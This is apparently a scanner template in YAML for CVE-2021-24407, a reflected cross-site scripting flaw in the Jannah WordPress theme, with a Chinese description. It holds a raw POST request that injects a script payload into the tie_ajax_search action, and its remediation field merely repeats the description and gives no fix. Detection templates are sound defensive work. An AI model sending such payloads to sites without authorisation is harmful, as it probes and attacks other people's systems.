id: CVE-2021-24407
info:
  name: Jannah < 5.4.5 - Reflected Cross-Site Scripting (XSS)
  author:
  - l0ne1y
  tags:
  - cve
  - cve2021
  - wordpress
  - xss
  - wp-theme
  description: |-
    WordPress Theme Jannah admin-ajax.php POST请求 跨站脚本漏洞
    WordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress 插件是WordPress开源的一个应用插件。

    Jannah WordPress 在5.4.5之前存在跨站脚本漏洞，该漏洞源于在5.4.5之前的Jannah WordPress主题没有正确地清理它的tie ajax搜索ajax动作中的POST参数，导致了一个反射跨站点脚本(XSS)漏洞。
  reference:
  - https://wpscan.com/vulnerability/fba9f010-1202-4eea-a6f5-78865c084153
  - https://nvd.nist.gov/vuln/detail/cve-2021-24407
  severity: medium
  classification:
    cve-id:
    - cve-2021-24407
    cwe-id:
    - cwe-79
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
  remediation: |-
    WordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress 插件是WordPress开源的一个应用插件。

    Jannah WordPress 在5.4.5之前存在跨站脚本漏洞，该漏洞源于在5.4.5之前的Jannah WordPress主题没有正确地清理它的tie ajax搜索ajax动作中的POST参数，导致了一个反射跨站点脚本(XSS)漏洞。
requests:
- matchers:
  - type: word
    part: body
    words:
    - </script><script>alert(document.domain)</script>
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: application/x-www-form-urlencoded

    action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>
